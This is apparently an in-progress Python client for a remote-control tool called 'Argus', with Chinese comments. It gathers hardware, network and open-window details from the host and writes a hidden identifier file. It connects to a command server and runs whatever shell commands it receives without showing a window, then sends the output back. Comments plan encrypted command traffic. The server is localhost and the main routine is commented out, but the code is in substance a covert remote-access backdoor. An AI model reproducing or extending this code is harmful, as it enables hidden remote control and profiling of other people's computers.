import json
import pprint
import socket
import subprocess
import time
import netifaces
import uuid
import os
import platform

import psutil
import win32api
import win32con
import pygetwindow as gw

# 设置服务器的IP地址和端口号
server_ip = "127.0.0.1"
server_command_port = 1818
server_inform_port = 1819

client_id = ""
# 目前有多个问题亟需解决：
# 1. 直接操作被控制端窗口属性，网络状态等Python函数操作
# 2. 传输指令和回显需要加密
# 3. 部分涉及到程序自身资源调配的指令，需要专门编写
# TODO: 设计一个自主协议，区分CMD指令，Pthon函数直接调用和程序调配。  因此就需要先抓包，看看数据包情况。
# 大致设想：
# {FLAG:ARGUS, SENDER:SERVER, TYPE:CMD_Command, UUID:"", CONTENT:"", VERSION:"", MSG_ID:""}
# {FLAG:ARGUS, SENDER:CLIENT, TYPE:CMD_Command_Echo, UUID:"", CONTENT:"", VERSION:"", MSG_ID:""}


def get_comp_info():
    # 信息获取函数，得到硬件基础信息，网络信息等
    interfaces = netifaces.interfaces()
    date_info = time.strftime("%Y-%m-%d", time.localtime())
    cpu_info = {
        'cpu_logical_cores': psutil.cpu_count(logical=True),
        'cpu_physical_cores': psutil.cpu_count(logical=False),
        'cpu_freq': psutil.cpu_freq(),
        'cpu_percent': psutil.cpu_percent()
    }
    basic_info = {
        'os_info': platform.platform(),
        # 获取操作系统的详细信息
        'system_info': platform.uname(),
        # 获取 CPU 信息
        'cpu_info': cpu_info,
        # 获取内存信息
        'memory_info': psutil.virtual_memory(),
        # 获取硬盘信息
        'disk_info': psutil.disk_partitions()
    }
    network_info = []
    for iface in interfaces:
        try:
            addresses = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addresses:
                ipv4_addresses = addresses[netifaces.AF_INET]
                mac_address = addresses[netifaces.AF_LINK]
                network_info_frag = {
                    'Interface': iface,
                    'IPV4_address': ipv4_addresses[0]['addr'],
                    'IPV4_netmask': ipv4_addresses[0]['netmask'],
                    'MAC_address': mac_address[0]['addr']
                }
                network_info.append(network_info_frag)
        except ValueError as e:
            print(f"An error occurred during obtaining the network info. {e}")
            pass
    comp_info = {
        'title': "Comprehensive Info",
        'content': {
            'overview': platform.uname()._asdict(),
            'basic_info': basic_info,
            'network_info': network_info,
            'date_stramp': date_info,
            'uuid': client_id
        }
    }

    return comp_info
    # Return Data Format:
    # [{'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': 'x'},
    # {'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': 'x'},
    # {'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': ''},
    # {'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': 'x'},
    # {'Date': '2023-08-05'}]


def get_all_windows():
    window_collection = []
    all_windows = gw.getAllWindows()

    for window in all_windows:
        window_info = {
            "Window title": window.title,
            "Visibility": window.visible,
            "Height": window.height,
            "Width": window.width,
            "Is Minimized": window.isMinimized,
            "Is Maximized": window.isMaximized,
            "Is Active": window.isActive
        }
        window_collection.append(window_info)

    return window_collection


def generate_uuid():
    # 获取 UUID 文件路径
    uuid_file_path = os.path.join(os.path.expanduser("~"), "Argus_UUID.ini")

    # 尝试读取已有的 UUID
    if os.path.exists(uuid_file_path):
        with open(uuid_file_path, 'r') as f:
            cid = f.read()
            print("The UUID exists.")
    else:
        # 生成新的 UUID 并写入文件
        cid = str(uuid.uuid4())
        with open(uuid_file_path, 'w') as f:
            f.write(cid)
            os.chmod(uuid_file_path, 0o600)
            win32api.SetFileAttributes(uuid_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            print("UUID created successfully.")

    return cid


def initialize_socket(target_host, target_port):
    try:
        socket_instance = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_instance.connect((target_host, target_port))
        return socket_instance
    except ConnectionRefusedError:
        print("Connection refused by the target computer.")
    except socket.gaierror:
        print("Invalid server address.")
    except KeyboardInterrupt:
        print("User interrupted the connection initialization.")
        if socket_instance:
            socket_instance.close()
    except socket.error:
        print("Failed to create a socket object.")
    except Exception as e:
        print(f"Connection error: {str(e)}")
    return None


def get_info(client_socket):
    if client_socket is None:
        return None
    while True:
        try:
            # 设置接收超时时间为 10 秒
            # PS: 这个很有意思，即使是延时，也仍然在监听
            client_socket.settimeout(10)
            response = client_socket.recv(1024)
            response_str = response.decode('gbk').strip()
            if response_str.startswith("Connection Permitted: "):
                response_uuid = response_str[22:]
                print("Server Response UUID: " + response_uuid)
                if response_uuid == client_id:
                    print("Connection permitted, going to connect...")
                    connect_to_server(server_ip, server_command_port)

            else:
                print("Unrecognized Server Message:" + response_str)
        except socket.timeout:
            # 在测试阶段可能经常触发这个except，但是到时候会在服务器端写好keep alive，因此不用担心。
            print("服务器没有回应，等待响应超时")


def send_info(client_socket, send_info_buffer):
    if client_socket is None:
        return None
    try:
        client_socket.sendall(json.dumps(send_info_buffer).encode() + b'\n\n')
        print("已向服务器发送对应数据:" + send_info_buffer)
    except socket.timeout:
        print("连接超时，无法连接到服务器。")
    except Exception as e:
        # 其他异常处理，我也不知道会有什么问题
        print(f"连接出错: {str(e)}")
        socket.close()
    except KeyboardInterrupt:
        print("User Ended The Connection.")
        socket.close()


def connect_to_server(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((host, port))
        client_socket.send(b"Connection Successfully Built.\n")
        print("已连接到服务器")

        while True:
            data = client_socket.recv(1024)
            if not data:
                print("与服务器断开连接")
                break

            result = execute_command(data)

            client_socket.send(result)
            if result.decode('gbk') == "Connection Detach\n":
                client_socket.close()
                return 0

    except ConnectionRefusedError:
        print("无法连接到服务器")
    except KeyboardInterrupt:
        print("用户中断")
    finally:
        client_socket.close()
        print("已关闭连接")


process = None


def execute_command(command):
    global process

    command = command.decode().strip()
    print("收到指令:", command)

    try:
        if command.startswith('cd'):
            # 切换目录命令
            directory = command.split(' ')[1]
            os.chdir(directory)
            return "目录切换成功\n".encode()

        if command.startswith('Keep Alive'):
            return "Keep Alive\n".encode()

        if command.startswith('rc exit'):
            if process is not None and process.poll() is None:
                # 如果子进程存在且尚未终止，则终止子进程
                process.terminate()
                process.wait()
                process = None
            return "Connection Detached\n".encode()

        else:
            if process is None or process.poll() is not None:
                # 如果没有子进程或子进程已经终止，则创建新的子进程
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW  # 不显示窗口
                )
            else:
                # 如果子进程存在且尚未终止，则发送指令给子进程
                process.stdin.write(command.encode() + b'\n')
                process.stdin.flush()

        result = process.communicate()[0]
        print(result)
        return result
    except subprocess.CalledProcessError as e:
        error_msg = "命令执行失败: " + str(e)
        print(error_msg)
        return error_msg.encode()
    except Exception as e:
        print("An error occurred:", e)


if __name__ == "__main__":
    # try:
    #     client_id = generate_uuid()
    #     print(client_id)
    #     info_socket = initialize_socket(server_ip, server_inform_port)
    #
    #     comprehension_info = get_comp_info()
    #     get_info_thread = threading.Thread(target=get_info, args=(info_socket,))
    #     # 多线程，将监听端口单独放出，便于管理
    #     get_info_thread.start()
    #     send_info(info_socket, comprehension_info)

    #
    # except KeyboardInterrupt:
    #     print("User Ended The Connection.Global.")
    # except Exception as e:
    #     print("Error, code:" + str(e))

    #     # # # Debug Area Below # # #
    print(get_comp_info())
    print(get_all_windows())
    #     # connect_to_server(server_ip, server_command_port)
    #     # # # Debug Area Above # # #
